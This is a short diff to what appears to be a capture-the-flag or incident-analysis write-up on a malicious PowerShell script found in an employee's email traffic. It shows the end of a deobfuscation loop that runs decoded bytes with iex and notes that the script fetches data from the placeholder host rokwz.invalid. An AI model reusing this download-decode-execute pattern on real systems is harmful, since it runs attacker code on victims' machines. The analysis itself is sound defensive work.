@@ -31,4 +31,8 @@ $dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
 iex([System.Text.Encoding]::UTF8.GetString($dec))
 ```
 
+At this point it was confirmed that this was the malicious script that was ran while the employee was browsing their email. This is because the first line of the script makes an HTTP call to *http://rokwz.invalid/security*, matching the call seen in Wireshark. You might think we found what this script was doing, right? No it is not... we were tasked with finding the domain that the script made a POST request to and the DownloadData() function is an HTTP GET request.
+
+### Downloading the Data
+
 
